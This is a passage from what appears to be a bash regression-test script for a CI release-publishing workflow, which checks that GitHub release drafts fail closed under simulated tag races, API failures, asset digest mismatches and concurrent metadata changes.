[ "$(cat "$state_publish_wrong_head/draft")" = true ]
[ ! -f "$state_publish_wrong_head/patch-fields.log" ]
printf 'PASS publication rechecks local HEAD, exact draft assets, and latest state before PATCH\n'

for mutation in tag target prerelease immutable name body digest extra; do
  state=$scratch/state-publish-post-$mutation
  create_verified_draft "$state"
  if run_publish_draft_by_id "$state" env GH_ALLOW_PUBLISH=1 \
      GH_MUTATE_RELEASE_AFTER_PATCH="$mutation" >/dev/null 2>&1; then
    printf 'post-PATCH %s mutation was accepted\n' "$mutation" >&2
    exit 1
  fi
  [ "$(cat "$state/draft")" = false ]
  [ -f "$state/published" ]
done

state_publish_tag_race=$scratch/state-publish-tag-race
create_verified_draft "$state_publish_tag_race"
if run_publish_draft_by_id "$state_publish_tag_race" \
    env GH_ALLOW_PUBLISH=1 GH_RETARGET_TAG_AFTER_PATCH=1 >/dev/null 2>&1; then
  printf 'post-PATCH tag retargeting was accepted\n' >&2
  exit 1
fi
[ "$(cat "$state_publish_tag_race/draft")" = false ]

state_publish_latest_post=$scratch/state-publish-latest-post
create_verified_draft "$state_publish_latest_post"
if run_publish_draft_by_id "$state_publish_latest_post" \
    env GH_ALLOW_PUBLISH=1 GH_CHANGE_LATEST_AFTER_PATCH=1 >/dev/null 2>&1; then
  printf 'post-PATCH latest-release change was accepted\n' >&2
  exit 1
fi
[ "$(cat "$state_publish_latest_post/draft")" = false ]

state_publish_asset_state=$scratch/state-publish-asset-state
create_verified_draft "$state_publish_asset_state"
if run_publish_draft_by_id "$state_publish_asset_state" \
    env GH_ALLOW_PUBLISH=1 GH_BAD_ASSET_STATE_AFTER_PATCH=1 >/dev/null 2>&1; then
  printf 'non-uploaded post-PATCH asset state was accepted\n' >&2
  exit 1
fi
[ "$(cat "$state_publish_asset_state/draft")" = false ]
printf 'PASS post-publication checks reject metadata, asset, tag, and latest-state races\n'

state_unused_target=$scratch/state-unused-target
run_publish "$state_unused_target" env PRERELEASE=1 \
  GH_RELEASE_TARGET_RESPONSE=main >/dev/null
[ "$(cat "$state_unused_target/target")" = main ]
[ "$(cat "$state_unused_target/tag-object")" = "$test_producer_sha" ]
[ "$(cat "$state_unused_target/prerelease")" = true ]

state_create_api_fail=$scratch/state-create-api-fail
if run_publish "$state_create_api_fail" env PRERELEASE=1 \
    GH_FAIL_RELEASE_CREATE=1 >/dev/null 2>&1; then
  printf 'release create API failure was accepted\n' >&2
  exit 1
fi
[ ! -f "$state_create_api_fail/tag-exists" ]
[ ! -f "$state_create_api_fail/exists" ]
[ ! -f "$state_create_api_fail/patch-fields.log" ]

state_create_tag_mismatch=$scratch/state-create-tag-mismatch
if run_publish "$state_create_tag_mismatch" env PRERELEASE=1 \
    GH_RELEASE_TAG_RESPONSE=other-tag >/dev/null 2>&1; then
  printf 'release create API tag mismatch was accepted\n' >&2
  exit 1
fi
[ -f "$state_create_tag_mismatch/exists" ]
[ "$(cat "$state_create_tag_mismatch/draft")" = true ]
[ ! -f "$state_create_tag_mismatch/patch-fields.log" ]
printf 'PASS create API binds release id/tag while Git ref owns commit identity\n'

for field in name body; do
  state=$scratch/state-create-$field-mismatch
  case $field in
    name) response=GH_RELEASE_NAME_RESPONSE=other-title ;;
    body) response=GH_RELEASE_BODY_B64_RESPONSE=b3RoZXItYm9keQ== ;;
  esac
  if run_publish "$state" env PRERELEASE=1 "$response" >/dev/null 2>&1; then
    printf 'release create %s mismatch was accepted\n' "$field" >&2
    exit 1
  fi
  [ -f "$state/exists" ]
  [ "$(cat "$state/draft")" = true ]
  [ ! -f "$state/patch-fields.log" ]
done
printf 'PASS create API binds release title and body to the staged notes asset\n'

state_invalid=$scratch/state-invalid
if run_publish "$state_invalid" env PRERELEASE=true >/dev/null 2>&1; then
  printf 'invalid PRERELEASE value was accepted\n' >&2
  exit 1
fi
[ ! -f "$state_invalid/calls.log" ]
printf 'PASS invalid prerelease mode is rejected before remote access\n'

state_release_api_fail=$scratch/state-release-api-fail
if run_publish "$state_release_api_fail" env PRERELEASE=1 \
    GH_FAIL_RELEASE_LIST=1 >/dev/null 2>&1; then
  printf 'release inventory API failure was treated as absence\n' >&2
  exit 1
fi
[ ! -f "$state_release_api_fail/tag-exists" ]
[ ! -f "$state_release_api_fail/exists" ]

state_ref_api_fail=$scratch/state-ref-api-fail
if run_publish "$state_ref_api_fail" env PRERELEASE=1 \
    GH_FAIL_REF_LIST=1 >/dev/null 2>&1; then
  printf 'tag inventory API failure was treated as absence\n' >&2
  exit 1
fi
[ ! -f "$state_ref_api_fail/tag-exists" ]
[ ! -f "$state_ref_api_fail/exists" ]
printf 'PASS release and tag inventory failures are fail closed\n'

state_existing_tag=$scratch/state-existing-tag
mkdir -p "$state_existing_tag"
: > "$state_existing_tag/tag-exists"
printf 'commit\n' > "$state_existing_tag/tag-type"
printf '%s\n' "$test_producer_sha" > "$state_existing_tag/tag-object"
if run_publish "$state_existing_tag" env PRERELEASE=1 >/dev/null 2>&1; then
  printf 'existing tag without a release was accepted\n' >&2
  exit 1
fi
[ ! -f "$state_existing_tag/exists" ]
[ ! -f "$state_existing_tag/events.log" ]

state_tag_race=$scratch/state-tag-race
if run_publish "$state_tag_race" env PRERELEASE=1 \
    GH_CREATE_TAG_TARGET=ffffffffffffffffffffffffffffffffffffffff >/dev/null 2>&1; then
  printf 'racing mismatched tag target was accepted\n' >&2
  exit 1
fi
[ -f "$state_tag_race/exists" ]
[ "$(cat "$state_tag_race/draft")" = true ]
[ ! -s "$state_tag_race/assets.tsv" ]
[ ! -f "$state_tag_race/patch-fields.log" ]

state_annotated=$scratch/state-annotated
run_publish "$state_annotated" env PRERELEASE=1 GH_ANNOTATED_TAG=1 >/dev/null
[ "$(cat "$state_annotated/prerelease")" = true ]
if grep -Fq -- '-X POST repos/GUF296/tb321fu-haptics-debs/git/refs' \
    "$state_annotated/calls.log"; then
  printf 'draft creator used a separate tag-creation transaction\n' >&2
  exit 1
fi
printf 'PASS draft create owns tag creation; existing and racing tags fail closed\n'

for mutation in id draft immutable tag target prerelease name body extra digest; do
  state=$scratch/state-mutation-$mutation
  if run_publish "$state" env PRERELEASE=1 \
      GH_MUTATE_SNAPSHOT=3 GH_MUTATE_KIND="$mutation" >/dev/null 2>&1; then
    printf 'concurrent %s mutation was accepted\n' "$mutation" >&2
    exit 1
  fi
  [ ! -f "$state/patch-fields.log" ]
done
printf 'PASS final single-snapshot gate rejects concurrent identity/title/body/state/asset changes\n'

state_upload_fail=$scratch/state-upload-fail
if run_publish "$state_upload_fail" env PRERELEASE=1 GH_FAIL_UPLOAD=1 >/dev/null 2>&1; then
  printf 'simulated upload failure was accepted\n' >&2
  exit 1
fi
assert_curl_auth_hygiene "$state_upload_fail"
[ "$(cat "$state_upload_fail/draft")" = true ]
[ ! -f "$state_upload_fail/patch-fields.log" ]
before=$(wc -l < "$state_upload_fail/events.log")
if run_publish "$state_upload_fail" env PRERELEASE=1 >/dev/null 2>&1; then
  printf 'existing failed draft was taken over on rerun\n' >&2
  exit 1
fi
[ "$before" -eq "$(wc -l < "$state_upload_fail/events.log")" ]

state_digest_fail=$scratch/state-digest-fail
if run_publish "$state_digest_fail" env PRERELEASE=1 GH_CORRUPT_DIGEST=1 >/dev/null 2>&1; then
  printf 'remote digest mismatch was accepted\n' >&2
  exit 1
fi
[ "$(cat "$state_digest_fail/draft")" = true ]
[ ! -f "$state_digest_fail/patch-fields.log" ]
printf 'PASS failures leave an unpublished draft that cannot be taken over\n'

grep -Fxq 'gh_path=/usr/bin/gh' "$ROOT/scripts/ci/publish-release.sh"
grep -Fxq 'curl_path=/usr/bin/curl' "$ROOT/scripts/ci/publish-release.sh"
grep -Fxq 'gh_path=/usr/bin/gh' "$ROOT/scripts/ci/publish-draft-release-by-id.sh"
printf 'PASS production publishers use fixed GitHub CLI and curl paths\n'

/usr/bin/python3 -I -B - \
  "$ROOT/scripts/ci/publish-release.sh" \
  "$ROOT/scripts/ci/publish-draft-release-by-id.sh" <<'PY'
import pathlib
import sys

for name in sys.argv[1:]:
    text = pathlib.Path(name).read_text()
    start = text.index("finish_remote_write() {")
    end = text.index("\n}\n", start)
    finish = text[start:end]
    if finish.index("remote_write_active=false") >= finish.index(
        "cancel_status=$pending_cancel_status"
    ):
        raise SystemExit(
            f"{name}: finish closes the transaction after sampling pending signals"
        )
    if finish.index("remote_write_active=false") >= finish.index(
        "cancel_name=$pending_cancel_name"
    ):
        raise SystemExit(
            f"{name}: finish closes the transaction after sampling pending signal name"
        )
PY
printf 'PASS remote-write finish ordering cannot clear an in-window INT or TERM\n'

/usr/bin/python3 -I -B - "$WORKFLOW" <<'PY'
import pathlib
import sys

text = pathlib.Path(sys.argv[1]).read_text()
group = "group: release-${{ github.repository }}-${{ inputs.release_tag != '' && inputs.release_tag || inputs.dispatch_id }}"
if text.count(group) != 1:
    raise SystemExit("same-tag concurrency group or dispatch-id fallback is missing")
if text.count("cancel-in-progress: false") != 1:
    raise SystemExit("release concurrency cancellation policy drifted")
if "PRERELEASE: ${{ inputs.prerelease && '1' || '0' }}" not in text:
    raise SystemExit("release prerelease input mapping is missing")
if "must set prerelease=true" not in text:
    raise SystemExit("release prerelease rejection is missing")
if sum(
    line.strip()
    == "/usr/bin/python3 -I -B scripts/ci/run-bounded-publication-fixture.py"
    for line in text.splitlines()
) != 1:
    raise SystemExit("bounded publication fixture command is missing or duplicated")
if "/bin/bash -p scripts/ci/test-release-publication.sh" in text:
    raise SystemExit("workflow bypasses the bounded publication fixture runner")
PY
printf 'PASS same repository/tag runs serialize without cancelling and empty tags use dispatch id\n'

printf 'RESULT=PASS release-publication-regressions\n'
